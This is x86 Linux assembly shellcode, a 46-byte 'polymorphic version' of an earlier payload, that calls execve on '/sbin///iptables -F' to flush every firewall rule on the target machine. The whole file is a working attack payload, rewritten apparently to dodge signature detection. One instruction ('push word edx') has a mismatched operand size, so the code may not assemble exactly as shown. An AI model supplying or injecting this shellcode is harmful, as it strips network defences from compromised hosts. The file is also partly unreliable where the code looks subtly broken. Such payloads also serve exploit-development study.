; Author: Hamza Megahed (@Hamza_Mega)
; Polymorphic version: @bugsam
; Date: 07/31/2020
; Original: 43 bytes
; Version: 46 bytes

global _start

_start:
	push 0xb
	pop eax
	cdq

	; *argv[2]
	push dword edx		; 0x00 ASCII NUL (end of string)
	push word 0x462d	; 0x46 ASCII 'F'; 0x2d ASCII '-'

	; *argv[1]
	push word dx		; 0x00 ASCII NUL (end of string)
	push 0x73656c62		; 0x73 ASCII 's'; 0x65 ASCII 'e'; 0x6c ASCII 'l'; 0x62 ASCII 'b'
	push 0x61747069		; 0x61 ASCII 'a'; 0x74 ASCII 't'; 0x70 ASCII 'p'; 0x69 ASCII 'i'
	push 0x2f2f2f6e		; 0x2f ASCII '/'; 0x2f ASCII '/'; 0x2f ASCII '/'; 0x6e ASCII 'n';
	push 0x6962732f		; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x73 ASCII 's'; 0x2f ASCII '/'

	push word edx		; *envp[]
	lea ecx, [esp+0x16] 	; *argv[2]
	push ecx
	lea ebx, [esp+0x08] 	; *argv[1] and (EBX) *pathname
	push ebx
	mov ecx,esp		; (ECX) -> *argv[]

	int 0x80		; call systemcall SYS_execve, no return on success
